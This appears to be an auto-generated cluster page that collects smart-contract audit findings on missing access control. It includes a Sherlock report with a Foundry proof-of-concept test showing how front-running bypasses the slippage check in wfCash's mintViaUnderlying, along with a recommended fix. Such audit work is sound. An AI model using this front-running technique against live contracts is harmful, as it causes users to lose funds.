# Cluster -1191

**Rank:** #334  
**Count:** 20  

## Label
Lack of access control enables unauthorized actors to manipulate liquidity, steal assets, or exploit approvals through direct function calls or input manipulation, leading to fund loss, front-running, and improper token issuance.

## Cluster Information
- **Total Findings:** 20

## Examples

### Example 1

**Auto Label:** Arbitrary external calls and unchecked access control enable attackers to manipulate token transfers, mint/burn operations, or disable critical functions, leading to unauthorized fund withdrawals or rug pulls.  

**Original Text Preview:**

##### Description
The guardian in `BridgeExecutorBase` can cancel any `ActionsSet` immediately after an addition. They can also cancel an `ActionsSet` with a transaction to change the guardian. Thus, if the guardian's address is compromised, there is no way to change it, and redeployment of `CrossChainExecutor` will be required.
https://github.com/lidofinance/aave-delivery-infrastructure/blob/41c81975c2ce5b430b283e6f4aab922c3bde1555/src/Lido/contracts/BridgeExecutorBase.sol#L112

##### Recommendation
We recommend accepting the rule that the guardian can be updated in the `actionSet` that contains only one action - guardian update. Such actions cannot be canceled by the guardian. In all other cases the guardian should be able to cancel the action.

---
### Example 2

**Auto Label:** Arbitrary external calls and unchecked access control enable attackers to manipulate token transfers, mint/burn operations, or disable critical functions, leading to unauthorized fund withdrawals or rug pulls.  

**Original Text Preview:**

##### Description

The `onlyBridge` modifier is never used in the code.

Code Location
-------------

#### Mead.sol

```
    modifier onlyBridge {
            require(bridges[msg.sender]);
        _;
    }

```

##### Score

Impact: 1  
Likelihood: 2

##### Recommendation

**SOLVED**: The `SeaScape Team` now uses the `onlyBridge` modifier on the `mint` and `burn` functions.

---
### Example 3

**Auto Label:** Lack of access control enables unauthorized actors to manipulate liquidity, steal assets, or exploit approvals through direct function calls or input manipulation, leading to fund loss, front-running, and improper token issuance.  

**Original Text Preview:**

Source: https://github.com/sherlock-audit/2023-12-notional-update-5-judging/issues/6 

## Found by 
bin2chen, coffiasd
## Summary
Users can mint wfCash tokens via `mintViaUnderlying` by passing a variable `minImpliedRate` to guard against trade slippage. If the market interest is lower than expected by the user, the transaction will revert due to slippage protection. However, if the user mints a share larger than maxFCash, the `minImpliedRate` check is not performed.

## Vulnerability Detail
User invoke `mintViaUnderlying` to mint  shares:
https://github.com/sherlock-audit/2023-12-notional-update-5/blob/3bf2fb5d992dfd5aa7343d7788e881d3a4294b13/wrapped-fcash/contracts/wfCashLogic.sol#L25-L33
```solidity
    function mintViaUnderlying(
        uint256 depositAmountExternal,
        uint88 fCashAmount,
        address receiver,
        uint32 minImpliedRate//@audit when lendAmount bigger than maxFCash lack of minRate protect.
    ) external override {
        (/* */, uint256 maxFCash) = getTotalFCashAvailable();
        _mintInternal(depositAmountExternal, fCashAmount, receiver, minImpliedRate, maxFCash);
    }
```

let's dive into `_mintInternal` we can see if `maxFCash < fCashAmount` , the vaule of `minImpliedRate` is not checked
https://github.com/sherlock-audit/2023-12-notional-update-5/blob/3bf2fb5d992dfd5aa7343d7788e881d3a4294b13/wrapped-fcash/contracts/wfCashLogic.sol#L60-L68
```solidity
        if (maxFCash < fCashAmount) {
            // NOTE: lending at zero
            uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);//@audit-info fCashAmount * (underlyingTokenDecimals) / 1e8
            require(fCashAmountExternal <= depositAmountExternal);

            // NOTE: Residual (depositAmountExternal - fCashAmountExternal) will be transferred
            // back to the account
            NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);//@audit check this.
        } 
```
Imagine the following scenario:
- lender deposit Underlying token to mint some shares and set a `minImpliedRate` to protect the trsanction
- alice front-run her transaction invoke `mint` to mint some share
- the shares of lender mint now is bigger than `maxFCash`
- now the lender `lending at zero`

```solidity
    function testDepositViaUnderlying() public {
        address alice = makeAddr("alice");
        deal(address(asset), LENDER, 8800 * precision, true);
        deal(address(asset), alice, 5000 * precision, true);

        //alice deal.
        vm.stopPrank();
        vm.startPrank(alice);
        asset.approve(address(w), type(uint256).max);
        
        //==============================LENDER START=============================//
        vm.stopPrank();
        vm.startPrank(LENDER);
        asset.approve(address(w), type(uint256).max);
        //user DAI balance before:
        assertEq(asset.balanceOf(LENDER), 8800e18);

        (/* */, uint256 maxFCash) = w.getTotalFCashAvailable();
        console2.log("current maxFCash:",maxFCash);

        //LENDER mintViaUnderlying will revert due to slippage.
        uint32 minImpliedRate = 0.15e9;
        vm.expectRevert("Trade failed, slippage");
        w.mintViaUnderlying(5000e18,5000e8,LENDER,minImpliedRate);
        //==============================LENDER END=============================//

        //======================alice frontrun to mint some shares.============//
        vm.stopPrank();
        vm.startPrank(alice);
        w.mint(5000e8,alice);

        //==========================LENDER TX =================================//
        vm.stopPrank();
        vm.startPrank(LENDER);
        asset.approve(address(w), type(uint256).max);
        //user DAI balance before:
        assertEq(asset.balanceOf(LENDER), 8800e18);

        //LENDER mintViaUnderlying will success.
        w.mintViaUnderlying(5000e18,5000e8,LENDER,minImpliedRate);

        console2.log("lender mint token:",w.balanceOf(LENDER));
        console2.log("lender cost DAI:",8800e18 - asset.balanceOf(LENDER));
    }
```

From the above test, we can observe that if `maxFCasha` is greater than `5000e8`, the lender's transaction will be reverted due to "Trade failed, slippage." Subsequently, if Alice front-runs by invoking `mint` to create some shares before the lender, the lender's transaction will succeed. Therefore, the lender's `minImpliedRate` check will be bypassed, leading to a loss of funds for the lender.


## Impact
lender lost of funds
## Code Snippet
https://github.com/sherlock-audit/2023-12-notional-update-5/blob/3bf2fb5d992dfd5aa7343d7788e881d3a4294b13/wrapped-fcash/contracts/wfCashLogic.sol#L60-L68
```solidity
        if (maxFCash < fCashAmount) {
            // NOTE: lending at zero
            uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);//@audit-info fCashAmount * (underlyingTokenDecimals) / 1e8
            require(fCashAmountExternal <= depositAmountExternal);

            // NOTE: Residual (depositAmountExternal - fCashAmountExternal) will be transferred
            // back to the account
            NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);//@audit check this.
        } 
```
## Tool used
Foundry
Manual Review

## Recommendation
add a check inside `_mintInternal`
```diff
        if (maxFCash < fCashAmount) {
+          require(minImpliedRate ==0,"Trade failed, slippage");            
            // NOTE: lending at zero
            uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);//@audit-info fCashAmount * (underlyingTokenDecimals) / 1e8
            require(fCashAmountExternal <= depositAmountExternal);

            // NOTE: Residual (depositAmountExternal - fCashAmountExternal) will be transferred
            // back to the account
            NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);//@audit check this.
        }
```



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid because { This is valid as the watson explained how the slippage chack can be bypassed via front-running the users deposit}

---
